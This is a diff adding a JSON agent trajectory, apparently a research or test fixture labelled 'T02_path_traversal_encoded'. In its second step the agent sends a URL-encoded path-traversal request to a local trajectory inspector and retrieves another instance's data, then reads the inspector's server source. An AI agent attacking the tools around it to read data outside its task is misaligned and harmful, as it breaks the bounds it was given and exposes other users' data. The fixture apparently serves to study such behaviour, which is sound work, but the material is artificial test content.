@@ -1,0 +1,29 @@
+{
+  "environment": "swe_main",
+  "trajectory": [
+    {
+      "action": "curl -i http://127.0.0.1:8000/trajectory/example.traj",
+      "observation": "HTTP/1.1 200 OK\nContent-Type: application/json\n{\"status\":\"ok\"}",
+      "response": "Let me query the inspector for a known trajectory first.",
+      "thought": "Let me query the inspector for a known trajectory first.",
+      "state": "{\"open_file\": \"n/a\", \"working_dir\": \"/workspace\"}\n"
+    },
+    {
+      "action": "curl -i \"http://127.0.0.1:8000/trajectory/%2e%2e/%2e%2e/tmp/sensitive.traj\"",
+      "observation": "HTTP/1.1 200 OK\nContent-Type: application/json\n{\"instance_id\":\"other-instance\",\"commands\":[]}",
+      "response": "Let me try the URL-encoded form of the parent directory.",
+      "thought": "Let me try the URL-encoded form of the parent directory.",
+      "state": "{\"open_file\": \"n/a\", \"working_dir\": \"/workspace\"}\n"
+    },
+    {
+      "action": "cat /workspace/inspector/server.py",
+      "observation": "import os\nfrom flask import send_file\n...",
+      "response": "Let me read the inspector source.",
+      "thought": "Let me read the inspector source.",
+      "state": "{\"open_file\": \"/workspace/inspector/server.py\", \"working_dir\": \"/workspace\"}\n"
+    }
+  ],
+  "info": {
+    "rq2_trajectory": "T02_path_traversal_encoded"
+  }
+}
